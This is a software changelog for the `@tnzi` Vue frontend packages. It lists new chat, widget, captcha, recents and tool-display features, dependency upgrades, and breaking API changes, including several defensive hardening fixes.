# Changelog

All notable changes to the `@tnzi/*` frontend packages are documented here. The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added

- `@tnzi/ui-admin`: `defineAdminApp({ billing: { stripeLink } })` (default `false`) and `TStripePaymentForm` prop `link` (`boolean | null`, default `null` = follow the billing config) to offer Stripe Link in the billing card forms.

- `@tnzi/ui-ai`: inline widgets, a new entry `@tnzi/ui-ai/widget`. `createWidgetToolRenderers({ runnerUrl, maxHeight?, handlers?, toolName? })` registers a renderer for `show_widget` (also matched as `mcp__<server>__show_widget`): a placeholder while the call is made, the widget once it completes (`TWidgetCall` / `TWidgetFrame`: the server's widget runner in a `sandbox="allow-scripts"` iframe, height following the document up to `maxHeight`, the page theme handed in as `--color-*` / `--font-*` / `--border-radius-*` variables and kept current, unmounted while far outside the viewport), the ordinary tool card when it failed. Bar actions: open larger, copy HTML, download HTML. Host <-> widget messages follow the MCP Apps names (`ui/initialize`, `ui/notifications/size-changed`, `ui/open-link`, `ui/notifications/host-context-changed`); `ui/message` and `tools/call` stay off unless `handlers.sendMessage` (each message confirmed by the user) or `handlers.callTool` with `allowedTools` are given. Also `createWidgetHost`, `composeWidgetDocument`, `standaloneWidgetDocument`, `readWidgetTheme`, `parseWidgetInput`. Locale keys `tools.widgetRunning` / `widgetDone` / `widgetFailed` / `widgetsDone` and section `widget` (en / zh-cn); a custom dictionary typed as `AiLocaleMessages` needs them.

- `@tnzi/ui-ai`: the open conversation's title in `TChatApp`'s top bar is editable when the shell has `recents`: clicking it edits it in place (whole title selected; Enter or blur saves, Escape cancels, an empty or unchanged title is not sent) through `recents.rename`, and a chevron after it opens Rename, Archive / Unarchive and Delete (confirmed in the bar, emitted as `delete-thread`). Not on the landing page, a conversation still being created, or one being opened. Exported as `TThreadTitle` (props `title`, `archived`, `enableRename` / `enableArchive` / `enableDelete`; events `rename`, `archive`, `unarchive`, `delete`). Locale keys `recents.searchPlaceholder`, `recents.closeSearch`, `recents.deleteThreadConfirm` (en / zh-cn).

- `@tnzi/ui-admin`: `useFileUrl` / `useFileUrls` re-sign their URLs shortly before the earliest token they hold expires (without flipping `loading`), and return a `refresh()` (`refresh(fileId?)` on `useFileUrls`) for an `<img>` `error` handler. A view mounted longer than the storage token TTL (10 minutes by default) used to keep handing out expired URLs, so any image fetched after that got a 404. `TFileImage` / `TFileLink` inherit the automatic re-sign.
- `@tnzi/core`: `FileUrlResolver.refreshAt(ids)` (when the earliest cached token among them stops being served) and `invalidate(ids)` (drop their tokens; one minted within `minReissueIntervalMs`, default 10 s, is kept so an image failing for another reason does not loop). The refresh margin is now capped at half of a token's lifetime, so a TTL shorter than the margin still caches.
- `@tnzi/ui-ai`: `preventPageZoom()` in `@tnzi/ui-ai/headless` (returns a restore function) and `defineChatApp` option `preventPageZoom` (default off): viewport meta `maximum-scale=1, user-scalable=no`, root `touch-action: pan-x pan-y` and `text-size-adjust: 100%`, and Safari's gesture events cancelled. Components that handle pinch themselves still receive their events. Also `withViewportValues(content, values)`.
- `@tnzi/ui-ai`: `compact` prop on `TLandingPage` and `TThreadComposer` (one-line composer, smaller headline, tighter spacing, safe-area gap under a sticky composer); `TChatApp` sets it below `sidebarMobileBreakpoint`. Theme token `--tnzi-ai-brand-mark-glyph-size` (default 18px, `applyAiTheme({ brandMarkGlyphSize })`) for the brand glyph in the sidebar header and the rail. `useAutoGrowTextarea` returns its `resize`. Slot prop `narrow` on `#thread-footer`; locale key `sidebar.close` (en / zh-cn).

- `@tnzi/ui-ai`: `TChatApp` prop `recents` (a `RecentThreadsController`, e.g. `useChatThreads().recents`): the conversation list's header folds the list (remembered under `sidebarStorageKey`), and on hover or keyboard focus offers View all, Search and a Filter and group menu (status Active / Archived / All, last activity 1d / 3d / 7d / 30d / All, group by Date / None, sort by Name / Date created / Last activity; filter and order go to the server with every page, all four remembered per browser); each row's "..." menu offers Rename (in place), Archive / Unarchive and Delete (still confirmed inline). View all sets `view` to `RECENTS_VIEW_ID` (`'recents'`), for which the shell renders `TRecentsPage` (Active / Archived tabs, search, last-activity times, paging, the same row actions; `#recents` slot to replace it). Prop `recentsInclude` filters that page the way a product filters `threads`.
- `@tnzi/ui-ai`: `TRecentsPage` and `TActionMenu` (a menu rendered on `<body>` next to its trigger, submenus in place, arrow keys / Home / End / Escape, focus returned to the trigger, keys through the overlay stack; type `ActionMenuItem`).
- `@tnzi/ui-ai`: `useChatThreads().recents` and option `recentsStorageKey` (default `'tnzi-ui-ai-recents'`, null to keep for the page only); `recents` helpers and types in `@tnzi/ui-ai/headless` (`recentsQuery`, `groupThreadsByDate`, `formatRecentActivity`, `formatRecentsMonth`, `normalizeRecentsPreferences`, `RecentsPreferences`, `RecentThreadsController`, …); `ThreadItem.createdAt` / `archived`; `ChatThreadsOperation` `rename-thread` / `archive-thread` / `unarchive-thread`; locale section `recents` (en / zh-cn). A custom dictionary typed as `AiLocaleMessages` needs it.
- `@tnzi/core`: `useThreadApi().archive(id)` / `unarchive(id)`; `ThreadListQueryDto.status` / `sort` with enums `ThreadListStatus` / `ThreadListSort`; `AgentThreadDto.archivedTime` / `AgentThreadDetailDto.archivedTime`.

- `@tnzi/ui-admin`: `useCrudPage` option `loadEditRecord(row)`, for lists whose rows are summaries. `openEdit` (and `editAction`) opens the edit form on the record it returns instead of on the row, a restored `?detail=edit:<id>` swaps it in and refuses saves until it has, and a failed load (reported through `onError` with the new op `'load'`) closes a form left on the incomplete row. Without it every field the row lacks is shown empty and saved empty. The Users page now uses it in place of its own copy of this logic.
- `@tnzi/core`: `safeLinkHref(url)` in `@tnzi/core/utils`, the URL itself when it is safe to bind to `<a :href>` (http(s), mailto:, tel:, blob:, `data:` images / audio / video, relative), otherwise `undefined`. It reads the scheme the way the URL parser does, after dropping leading control characters and every tab / newline.
- `@tnzi/core`: locale key `upload.cropFailed` (en / zh-cn).
- `@tnzi/core`: new domain `@tnzi/core/services/captcha` (own subpath + tsup entry), the client side of the backend's pluggable captcha provider layer. `useCaptchaApi` (`GET /captcha/config`, `GET /captcha/altcha/challenge`), `CaptchaClientConfigDto` / `CaptchaChallengeDto` / `CAPTCHA_TOKEN_HEADER`, `composeImageCaptchaToken` (the built-in picture's `{captchaId}:{code}` token), `resolveChallengeUrl`, a framework-agnostic widget driver `mountCaptchaWidget` (loads the provider script once through its `onload=` callback, renders reCAPTCHA v2 / hCaptcha / Turnstile, produces reCAPTCHA v3 tokens on demand, mounts the `<altcha-widget>` web component, returns `reset` / `execute` / `destroy`) and the Vue composable `useCaptchaWidget` around it. In-flight script loads are parked on the globalThis adapter registry, per this package's module-level-state rule.
- `@tnzi/ui`: `<TCaptcha>` - one field for whichever provider the deployment runs. Reads `config` (`/captcha/config`, or `/auth/config`'s `captcha`), renders the built-in picture (`<TImageCaptcha>`, moved down from `@tnzi/ui-admin`'s `TLoginCaptcha`) or the provider's widget, exposes `v-model:token`, `execute()` (what makes invisible providers produce a token at all) and `reset()` (tokens are single-use). Standalone by design: a consumer's contact form uses it against its own `[RequireCaptcha("contact")]` endpoint without the login shell.
- `@tnzi/ui`: `LoginFeatures.captcha` (the client config from `/auth/config`) and `LoginFeatures.captchaOnPasswordRecovery`; `PwdLoginPayload.captchaToken` / `SendCodePayload.captchaToken`; `readCaptchaChallenge` (reads the `IDENTITY_CAPTCHA_REQUIRED` envelope for any provider, still understanding a pre-provider backend that only sends the picture); `LoginContext.resolveUrl` (the API-base resolver the modules hand to `<TCaptcha>` for Altcha).
- `@tnzi/ui-admin`: `TLoginPage` prop `resolveUrl` (defaults to the injected admin client's `resolveUrl`).
- `@tnzi/ui-admin`: the `ResetPwd` login module gates its send-code step with the captcha when the backend enables `EnableCaptchaOnPasswordRecovery` (that endpoint sends a real SMS / email per call and was the one send endpoint without any captcha). Settings-center labels for the new switch (en / zh-cn).
- `@tnzi/mobile`: `TLoginForm` / `TRegisterForm` accept a `captchaToken` prop and a `#captcha` slot for a consumer-rendered provider widget; the submit payload (and `useLoginForm`'s `LoginCredentials`) carries the unified `captchaToken` (`{captchaId}:{code}` for the picture props, the widget's token otherwise).
- `@tnzi/core`: locale keys `auth.refreshCaptcha` / `auth.captchaLoadFailed` / `auth.captchaRequired` / `auth.captchaInvalid` / `auth.captchaUnsupported` (en / zh-cn).
- `@tnzi/core`: `isImeComposing(event)` in `@tnzi/core/utils`, whether a key event belongs to an IME composition (`isComposing`, or the `keyCode` 229 Enter that Safari sends after `compositionend`).
- `@tnzi/ui-ai`: `TModelSelector` prop `providerLogo(provider)` (the logo URL, or nothing for the generic glyph); `TLandingPage` prop `disabled`; `TToolCallDisplay` prop `streaming`; `AgentToolCall` and `AgentExecutionEvent.toolCalls[]` carry `isSuccess` / `error`.
- `@tnzi/ui-ai`: locale keys `chat.generating` / `chat.copyCode` / `chat.agentName` / `chat.threadsLabel` / `chat.deleteConfirm`, `landing.greeting` / `landing.placeholder`, `composer.micDenied`, `settings.security` / `settings.personalization` / `settings.about` and `embed.title` (en / zh-cn). A custom dictionary typed as `AiLocaleMessages` needs them.
- `@tnzi/ui-ai`: `TChatApp` / `TThreadMessage` prop `showAgentByline` (default `true`). Off, an answer starts with its text instead of the row with the agent's mark, name and label (the `role` slot is not rendered either); an answer still being written shows a pulsing dot until its first words arrive and while the agent works after a tool call, then the caret at the end of the text. The assistant turn carries `aria-busy` while it streams.
- `@tnzi/ui-ai`: `useChatThreads().openingThreadId`, the thread `selectThread` is loading. `TChatApp` and `TThreadList` take it as prop `openingThreadId`: the clicked row is highlighted at once (a spinner in place of its icon, `aria-current` / `aria-busy`), and the main area shows `TThreadLoading` (new export) under that thread's title instead of the previous transcript, with sending held until the transcript arrives. `#sidebar-content` gets slot prop `opening-thread-id`, `TThreadList`'s `row` slot gets `opening`.
- `@tnzi/ui-ai`: type `VoiceInputErrorCode` from `@tnzi/ui-ai/headless`; locale keys `chat.openingThread` and `composer.voiceMicBlocked` / `voiceMicNotGranted` / `voiceServiceNotAllowed` / `voiceNoMicrophone` / `voiceNetwork` / `voiceNoSpeech` / `voiceLanguageNotSupported` / `voiceAborted` / `voiceUnavailable` (en / zh-cn). A custom dictionary typed as `AiLocaleMessages` needs them.
- `@tnzi/core`: `useOverlayLayerStack()` in `@tnzi/core/headless`, the page's stack of open overlays in the order they opened (`open` / `close` / `isOpen` / `isTop` / `top`, reactive `layers`), plus `createOverlayLayerStack()` and `resetOverlayLayerStack()` (tests, SSR). Ordering only, no DOM; it lives on core's globalThis registry, so every bundle and every copy of a UI package on a page shares one stack.
- `@tnzi/ui`: `useOverlayLayer(active, { onEscape, onKeydown, root })`, the keyboard side of that stack: only the topmost overlay gets Escape and the other keys it asks for. Returns `{ isTop }`; `useFocusTrap` joins the stack by itself and returns the same. One document listener picks the top layer once per key press; with two copies of the package on a page, a key press one copy handled is stamped so the other stands back.
- `@tnzi/ui-ai`: `TChatApp` prop `threadTitleOf(threadId)`, the top bar's title for a conversation being opened that is listed somewhere other than `threads` (a product's own nav group); `useStreamMarkdown` option `labels` (`StreamMarkdownLabels`, a ref or getter is followed); `TStreamLoader` prop `label`.
- `@tnzi/ui-ai`: `TSettingsDialog` props `narrowBreakpoint` (default 768) and `narrow`; `useSettingsDialog().narrowView` / `showSections()` and type `SettingsNarrowView`; `useViewportBelow(breakpoint)` in `@tnzi/ui-ai/headless`; locale keys `settings.sections` / `settings.backToSections` (en / zh-cn).
- `@tnzi/ui-ai`: the CSS custom property `--tnzi-overlay-inset-top`, a strip at the top of the page that the package's overlays keep clear of (a frameless window's title bar). `TSettingsDialog`, `TCommandPalette`, `TCollapsibleSidebar`'s mobile drawer and `TSidebarChat` keep their content below it (their backdrops cover it, see Changed); `TFloatingChat`'s window shrinks on a short viewport instead of rising into it. Declare it on `:root` or `body`: the overlays are teleported there.
- `@tnzi/ui-ai`: prop `brandWordmark` (an Iconify name) on `TChatApp`, `TGuestWelcome`, `TAuthPage` and `TAuthRoute`, and `defineChatApp` login option `brandWordmark` (passed to the sign-in page and the guest welcome screen). The product's logotype is drawn in place of the brand name text: 1em of the name's font size high, as wide as the icon's aspect ratio, centred in the line the text occupied (whose height is kept, so nothing around it moves), `currentColor` following the theme and fixed fills keeping their colour. `brandName` stays in place as visually hidden text and is still the accessible name; without `brandWordmark` the markup is unchanged.
- `@tnzi/ui-ai`: `TToolStep`, a tool call drawn as a step of the answer: one quiet line (state mark, `label`, `subject` from the input, chevron) with no card chrome, opening a hairline-bordered box (default slot); `meta` slot for short text on the line, `after` slot always in view (files, pictures), `icon` slot, props `mono` / `icon` / `expandable` / `defaultOpen`, event `toggle`. Body parts `TToolFields` (labelled lines from `toolFields(value)`), `TToolLinkList` (web pages: title, site, opening in a new tab; no favicons fetched) and `TToolOutput` (text, monospace on an inset well or prose, folded past `foldLines`, default 12). Helpers `toolResultText`, `toolResultView`, `toolFields`, `toolLinks`, `readableFieldName`, `webHref`, `linkDomain`; types `ToolField`, `ToolLink`, `ToolResultView`. All from `@tnzi/ui-ai/components`.
- `@tnzi/ui-ai`: views for the Claude Code CLI's built-in `WebSearch` (the query; opened, the pages found) and `WebFetch` (the site read; opened, its address and what the CLI read from it), used by default for those exact tool names after the product's own renderers (`BUILT_IN_TOOL_RENDERERS`, `TWebSearchCall`, `TWebFetchCall`). `parseWebSearchResult(text)` reads the CLI's result text and never throws (unreadable text comes back as text); `webFetchTarget(input)`, `WEB_SEARCH_TOOL` / `WEB_FETCH_TOOL`.
- `@tnzi/ui-ai`: locale section `tools` (`running` / `completed` / `failed` / `pending`, `showAll` / `showLess`, `results` / `noResults`, `webSearchRunning` / `webSearchDone` / `webSearchFailed`, `webFetchRunning` / `webFetchDone` / `webFetchFailed`; en / zh-cn). A custom dictionary typed as `AiLocaleMessages` needs it.
- `@tnzi/ui-ai`: `TToolRun`, tool calls made back to back (no reply text between them) as one quiet line: while the run goes on, a working mark (slot `mark`) and what the latest step is doing, the words sliding in (not with reduced motion); once done, the run summed up by kind, the biggest kind first, at most three kinds then "N more", failures said apart in the danger colour with a failure mark, steps the answer stopped before as "N not finished". Opened: one hairline box with a row per step, each its renderer's view (`TToolStep` draws itself as a 36px row whose detail opens in place); a run of one step opens straight onto it. Props `toolCalls`, `streaming`, `active`.
- `@tnzi/ui-ai`: a tool registration may be an entry `{ component?, describe?, alwaysVisible? }` (`ToolRendererEntry`; a bare component still works). `describe` (a `ToolStepDescription` or a `ToolStepDescriber` `(toolCall, messages) => …`) gives the step's `running` / `done` / `failed` phrases, `many(count)` for a counted summary, the `kind` steps are counted under and the `subject`; without it a step reads as its tool's name ("Used Read File"), and the generic view uses it for its line. `alwaysVisible` (a flag or a per-call function) keeps a step whole under its run's line; `TToolStep`'s `after` slot moves under the line by itself inside a run. Product and built-in entries merge field by field.
- `@tnzi/ui-ai`: exports `TToolRun`, `replyParts` / `segmentReply` with `ReplyPart` / `ReplySegment` / `SegmentedReply`, `resolveToolRendererEntry`, `resolveToolEntry`, `describeWebSearch` / `describeWebFetch`, `describeToolStep`, `defaultToolStepDescription`, `summarizeToolRun`, `runningRunLabel`, `stepPhrase`, `bareToolName`, types `ToolRenderer`, `ToolRendererEntry`, `ToolStepDescription`, `ToolStepDescriber`, `ToolStepDescribe`, `ToolRunStep`, `ToolRunSummary`, `ToolRunSummaryPart`.
- `@tnzi/ui-ai`: locale keys `tools.summaryJoin` / `moreSteps` / `stepsFailed` / `stepsNotFinished` / `usingTool` / `usedTool` / `usedToolTimes` / `toolFailed` / `readingPage` / `readPage` / `readPages` / `readPageFailed` (en / zh-cn).

### Changed

- `@tnzi/ui-admin`: the billing card form (`TStripePaymentForm`, used by the subscribe, pay-now and card-setup dialogs) no longer offers Stripe Link: the Payment Element is created with `wallets: { link: 'never' }`, so the "Save my information for faster checkout" box (email, phone, name) is gone. Restricting the intent to cards server-side does not hide it, since Link is a card wallet. Turn it back on with `billing.stripeLink` or the `link` prop.
- `@tnzi/ui-ai`: `TToolRun`'s finished line reads as failed (failure mark, danger-coloured text) only when a failure was not got past. A failed step followed later in the run by a completed step of the same kind (`ToolStepDescription.kind`) counts as retried: it is said in the line's muted text ("A step retried after an error" / "2 steps retried after errors", zh-cn "1 步出错后重试" / "{count} 步出错后重试"), with no mark, and opened it still shows as failed. `ToolRunSummary.unrecoveredCount` is new (`failedCount` still counts every failed step), `ToolRunSummaryPart.tone` gains `'recovered'`, and locale keys `tools.stepRecovered` / `tools.stepsRecovered` are new (en / zh-cn); a custom dictionary typed as `AiLocaleMessages` needs them.
- `@tnzi/ui-ai`: `TRecentsPage`'s search opens in the Active / Archived row instead of a row of its own (up to 384px x 32px, x and Escape clear and collapse it, focus returns to the search button), and each conversation is one line, title on the left and last activity on the right (rows 53px, 8px hover radius, inset hairlines).
- `@tnzi/ui-ai`: below `sidebarMobileBreakpoint` the sidebar drawer is always the expanded sidebar: `useSidebarState().setMode('icon')` (and `cycle()`) open it expanded while narrow and never store the mode, `TCollapsibleSidebar` draws `icon` as expanded when `isMobile`, and the header's collapse button closes the drawer. A phone used to get a drawer holding only the icon rail. Narrow screens also drop the `disclaimer` line, shrink the landing headline (36 -> 26px), start both composers one line tall and tighten the top bar and conversation gutters; wide screens are unchanged.
- `@tnzi/ui-ai`: overlay backdrops cover the whole viewport, including the strip `--tnzi-overlay-inset-top` declares (`TSettingsDialog`, `TCommandPalette`, `TCollapsibleSidebar`'s mobile mask, `TSidebarChat`'s overlay). The variable now only says how far overlay content keeps clear: the dialog centres below it, and the narrow sheet, the drawer, the palette and the sidebar chat panel start below it. A backdrop that stopped below the strip left the content under it bright while everything else dimmed.
- `@tnzi/ui-ai`: `TThreadList` rows are titles only (no icon, secondary text colour); delete moved from the row's ✕ into its "..." menu (confirmation unchanged); the heading is 13px and folds the list; `showAddButton` defaults to `false`; the search box opens from the heading's Search action; the opening spinner sits at the row's end.
- `@tnzi/ui-ai`: `useChatThreads` asks for active (unarchived) conversations by default and sends the chosen order.
- `@tnzi/ui-ai`: links to another site in rendered assistant markdown (`useStreamMarkdown`, so `TStreamMarkdown` and both message renderers) open in a new tab with `rel="noopener noreferrer"`; links within the page's origin, page anchors, `mailto:` and `tel:` open in place. A custom `markdownIt` instance does not get the rule.
- `@tnzi/ui-ai`: `TToolCallCard` (the view of every tool without a renderer) is drawn with `TToolStep`: the tool's readable name and the first short string of its input on one quiet line; opened, the input as labelled lines and the result read for a person (pages as links, JSON as labelled lines, text folded at 12 lines, pictures), never as raw call JSON. The duration and the bordered name chip are gone; the root keeps class `t-tool-card`, the old `t-tool-card__*` inner classes are replaced by `t-tool-step__*`.
- `@tnzi/ui-ai`: `TThreadMessage`'s action buttons (copy, regenerate, ratings, edit) have no border or fill at rest: a 28px hit area with a 16px glyph in the secondary text colour, a faint wash on hover, a focus ring for the keyboard, a pressed rating in the accent text colour. The row starts 6px left so the first glyph lines up with the answer; it still shows on hover or keyboard focus only (always on touch).
- `@tnzi/ui-ai`: sidebar rows (`TSidebarNav` items, `TThreadList` rows and its Show more) are 32px high with an 8px radius (were 36 / 10), 1px apart (was 2).
- `@tnzi/ui-ai`: a tool renderer map is looked up by own entries only (`resolveToolRenderer`), so a tool named `constructor` or `toString` no longer resolves to an inherited property.
- `@tnzi/ui-ai`: `TThreadMessage` and `TChatMessage` show each run of consecutive tool calls with `TToolRun` instead of one step line per call; live and history take the same path. While a run is the last thing on screen, `TThreadMessage`'s "still writing" mark (the `agent-mark` slot with `placement: 'pending'`, now also given `inRun: true`; `agentStreamingIcon`; or the pulsing dot) sits at the start of the run's line instead of under it. `ToolRendererMap` values are `Component | ToolRendererEntry`.
- All packages: dependencies moved to their latest releases. Runtime: `vue` 3.5.44, `vue-router` 5.4, `pinia` 4.1, `naive-ui` 2.45.3, `@vueuse/core` 15, `@iconify/vue` 5.0.3, `@iconify/utils` 3.1.7, `zod` 4.6, `markdown-it` 15.0.3 (fixes for quadratic-time inputs), `shiki` 4.5, `katex` 0.19, `cropperjs` 2.3, `colord` 2.10, `vant` 4.10.2. `@vueuse/core` 15 declares `engines.node >= 22`, so installing `@tnzi/ui` / `@tnzi/ui-admin` on Node 20 prints an engine warning.
- `@tnzi/ui`: `TImageUpload`'s initial crop box covers 90% of the image instead of 90% of the cropper canvas (cropperjs 2.3 sizes the selection from `<cropper-image>`), and an image that had already loaded, or whose `src` was set after it connected, no longer leaves the cropper empty. The two barrels carry the 2.8 kB (gzip) this costs.
- `@tnzi/ui`: modals using naive-ui's default `mask-closable` close on a mask click again (naive-ui 2.45.1 had broken it).
- `@tnzi/ui-admin`: `createAdminApp`'s 404 catch-all redirects by name with `params: {}`, so an unknown URL no longer logs vue-router's "Discarded invalid param(s) \"pathMatch\"" warning. A `notFoundRedirect` given by name gets the same treatment: a target route that declared `pathMatch` and read the original path from the inherited param now finds it in `route.redirectedFrom` instead.
- `@tnzi/ui`: the library build no longer inlines constants across modules, so `dist` carries no bare `import "../../utils/placeholders.js"` for a consumer's bundler to drop with an "ignored bare import" warning.
- `@tnzi/core`: `HttpSchemaBinding.schema`, `SchemaValidationMiddlewareOptions.resolveSchema` and the validation adapter are typed with `ZodType` instead of the deprecated `ZodTypeAny` (the same type), and the e-mail / URL rules use `check(z.email())` / `check(z.url())` instead of the deprecated `.email()` / `.url()` methods, with identical issues and order.
- `@tnzi/core`: `truncate` moves a cut that would fall inside a surrogate pair one code unit back, so the head never ends in half an emoji (U+FFFD on screen); the result can be one unit shorter than `maxLength`. A failed download's non-JSON error text is cut with it. `@tnzi/ui-admin` detail section badges take the label's first code point, and the knowledge base and template card excerpts are cut with `truncate`.
- `@tnzi/ui` **(breaking)**: `TnziUiResolver` resolves only the `T*` components `@tnzi/ui` exports and takes no options (`prefix` is gone). It claimed every `T`-prefixed name, so listed before `TnziUiAdminResolver()` it turned `<TCrudPage>`, or an app's own `T*` component, into an import from `@tnzi/ui` that failed the build.
- `@tnzi/ui` **(breaking)**: `TTable`'s `sort` event reports `null` as the order when the user clears a column's sort (naive's third click, `order: false`), which was forwarded as `'desc'` so a sort could never be cleared. The handler type is `'asc' | 'desc' | null`.
- `@tnzi/ui` **(breaking)**: `TReloadButton` given a handler (`@reload` and `:on-reload` are the same vnode prop) calls and awaits it once and no longer emits `reload` as well; the emit ran the same handler a second time. Without a handler it still emits.
- `@tnzi/ui`: `useFormRules().password()` defaults to 6-128 characters (was 8-32), so it never refuses a password the backend's default policy (minimum 6, no maximum) accepts; register / reset / forced change / invitation rejected password-manager passwords over 32.
- `@tnzi/ui`: `TStatusBadge` renders the muted `-` placeholder for a `null` / `undefined` / blank value with no `label`, `labelKey` or mapping entry, instead of a pill reading `null`.
- `@tnzi/ui`: `TImageUpload` exports a crop of a JPEG as JPEG and of anything else as PNG (transparency kept), and hands `upload` a `File` named after the source with a matching extension and type instead of a nameless JPEG `Blob`. The `error` event carries the message of the `Error` the upload function threw (falling back to `upload.uploadFailed`); type and size refusals use `upload.fileTypeLimit` / `upload.fileSizeLimit`.
- `@tnzi/ui`: `TButtonIcon` puts `class` / `style` / `data-*` on the button. With a tooltip the root is `NTooltip`, which dropped them, so `TReloadButton`'s spin and `TPinToggler`'s active class never showed.
- `@tnzi/ui`: `TAttachmentWall` checks file links with `safeLinkHref` (an allow-list); `file:`, non-media `data:` and custom schemes now become `#` as well.
- `@tnzi/ui`: `useEcharts` registers the SVG renderer, so `renderer: 'svg'` works; apps that use `useEcharts` carry that renderer.
- `@tnzi/ui-ai`: `useSidebarState` starts `hidden` below the mobile breakpoint (keeping the persisted mode for a wider viewport) and persists only modes chosen on a desktop viewport.
- `@tnzi/ui-ai`: `TWorkflowCanvas` renders node type `custom` as a `TWorkflowNode` status card and edge type `animated` as the flowing `TWorkflowEdge`, the two types `useWorkflowVisualization` emits; a consumer `#node-custom` / `#edge-animated` slot wins.
- `@tnzi/ui-ai`: `normalizeCjkSpacing` spaces CJK text only from an adjacent ASCII letter or digit and is idempotent.
- `@tnzi/ui-ai`: `TCitation` and `TSourceCitations` bind only links `safeLinkHref` accepts; a refused citation URL renders as a plain card / a link without `href`.
- `@tnzi/ui-ai` **(breaking)**: `TModelSelector` no longer loads provider logos from `models.dev`. Every user who opened the picker told that host their address and each provider name the deployment configures, and a strict CSP broke the images. Rows show a generic glyph unless `providerLogo` returns a URL; to keep the old images, pass `` (p) => `https://models.dev/logos/${encodeURIComponent(p)}.svg` ``.
- `@tnzi/ui-ai`: user-visible label defaults come from the dictionary instead of English literals: `TChatApp`'s `threadsLabel`, `deleteConfirmLabel`, `composerPlaceholder`, `agentName`, `landingGreeting`, `landingPlaceholder`, `settingsSections` and `settingsTitle`, the same props of `TThreadList` / `TLandingPage` / `TThreadMessage`, `TSettingsDialog`'s `title`, `TCommandPalette`'s placeholder, empty state and labels, the embed widgets' header and button labels, `TMessageList`'s streaming line and the copy / download / open labels of `TArtifactPanel`, `TCodeBlock` and `TMessageActions`. English text is unchanged except `TChatApp`'s composer placeholder, now `chat.placeholder` ("Type a message..."). A prop still overrides; `settingsSections` left unset now means the built-in list named in the current locale.
- `@tnzi/ui-ai`: the account menu's built-in `account` entry opens the settings dialog on its Account section (when the dialog is on and lists that section). It only re-emitted `user-menu`, so in a product that did not listen it closed the menu and did nothing. `user-menu` still fires.
- `@tnzi/ui-ai`: `createTnziChat` wraps the widget in a naive theme (`useAiNaiveTheme`): the Tnzi palette instead of naive's stock green, light or dark after `<html>`'s `dark` class or `data-theme="dark"`.
- `@tnzi/ui-ai`: `TMathBlock` asks KaTeX for MathML only, which the browser lays out without a stylesheet. The HTML output needs `katex.css`, which the package never shipped, so formulas rendered as unpositioned glyphs next to a second, native copy.
- `@tnzi/ui` **(breaking)**: `LoginCaptchaData` is now `{ provider, captchaId?, imageBase64?, expirationSeconds? }` - `provider` says what to render, the picture fields are only present for `image`. `LoginCallbacks.getCaptcha` takes any purpose string (the backend's image endpoint accepts any valid purpose name now, not just `login` / `register`). The default callbacks send `captchaToken` on password login and on all three send-code flows (code-login / register / **password recovery**).
- `@tnzi/ui-admin`: `PwdLogin` / `CodeLogin` / `Register` render `<TCaptcha>` instead of the picture-only field, so a deployment that switches `AspNetCore:Captcha:Provider` to Turnstile / reCAPTCHA / hCaptcha / Altcha gets that widget on the login page with no consumer change. Submit calls `execute()` first and `reset()`s after a rejected attempt. The always-shown fields (code-login / register / reset-pwd) now appear when the backend enables them **and** a token can be produced: a script provider needs nothing from the consumer, the picture still needs `callbacks.getCaptcha`.
- `@tnzi/ui-ai`: `TAuthPage` renders the provider widget for a non-image challenge on the password pane (through `useCaptchaWidget`; `resolveUrl` prop, wired by `TAuthRoute` from `runtime.http.resolveUrl`, turns Altcha's relative challenge template into an absolute URL) and sends `captchaToken`. `useAuthPage` gains `captchaIsImage` and the `executeCaptcha` option. **Known gap**: this shell sends the code as soon as it switches to the code / register pane, so the backend's unconditional send-code captcha (`EnableCaptchaOnLogin` / `EnableCaptchaOnRegister`) surfaces as an error there rather than a widget; the admin login page handles it.
- `@tnzi/core`: `AuthConfigDto` gains `enableCaptchaOnPasswordRecovery` and `captcha: CaptchaClientConfigDto`; `CaptchaDto` is now the provider-aware `CaptchaChallengeDto` (`provider` + optional picture fields); `captchaToken?` on `LoginDto` / `RegisterDto` / `ForgotPasswordDto` / `ResendEmailConfirmationDto` / `SendQuickRegisterCodeDto` / `SendCodeLoginCodeDto` / `SendPasswordRecoveryCodeDto`; `getCaptchaJson(purpose: string)`.
- `@tnzi/mobile` **(breaking for tests only)**: `TPasswordReset`'s `sendCode` event is now the function prop `onSendCode(email, captchaToken?)`. A template's `@send-code="handler"` binds to it unchanged, but the form now waits for it: the resend countdown starts when it resolves, and a rejection keeps the button available and shows its message under the code field. The event could not report back, so a refused send (rate limit, captcha required) locked the button for 60s anyway. The component also takes `captchaToken` and a `#captcha` slot, as `TLoginForm` / `TRegisterForm` do; the token is the callback's second argument.
- `@tnzi/core` **(breaking)**: `useStoragePreviewApi().getGeneratedPreviewUrl(id)` is now `getGeneratedPreview(id)`, a Blob download with the caller's session. The endpoint is authenticated and takes no `?sig=`, so the URL it returned was refused in every `<img>` / `<iframe>`.
- `@tnzi/core`: the access-log, payment, notification (admin and inbox), conversation-admin, template and layout query types extend `PagedQueryDto` instead of `SortedPagedQueryDto`; those endpoints return a fixed order and dropped `sortBy` / `sortDescending` silently. `FileQueryDto` declares the direction the file query actually reads, `sortOrder` (`'asc' | 'desc'`) or `descending`.
- `@tnzi/ui-ai`: the action row under an assistant turn in `TThreadMessage` (copy, regenerate, ratings) is hidden until the turn is hovered or something in it has keyboard focus, and keeps its space while hidden, so nothing moves; on a device without hover it is always shown. A mouse click on one of its buttons does not keep it open after the pointer leaves.
- `@tnzi/ui-ai`: the sticky `TThreadComposer` sits lower: 16px between the box and the bottom edge, or with fine print (`TChatApp`'s `disclaimer`) 6px above the print and 8px below it, instead of 24px plus 10px. The landing composer is unchanged.
- `@tnzi/ui-ai` **(breaking)**: `useVoiceInput().error` is a `VoiceInputErrorCode` (`mic-blocked`, `mic-not-granted`, `service-not-allowed`, `no-microphone`, `network`, `no-speech`, `language-not-supported`, `aborted`, `unavailable`) instead of an English sentence, and is set for every recogniser error, not only `not-allowed`. `not-allowed` is told apart by the microphone permission (denied: blocked for this site; granted: the browser refuses its speech service; otherwise not granted). `isSupported` is also false on a page that is not a secure context or whose permissions policy turns the microphone off; `isListening` is true from `start()` (the browser may still be asking for the microphone); `lang` accepts a ref or getter, read at each start; a `no-speech` / `aborted` from a session the user stopped is not reported. `TThreadComposer` turns each code into its own sentence (what happened, what to do) and follows `voiceLang` changes.
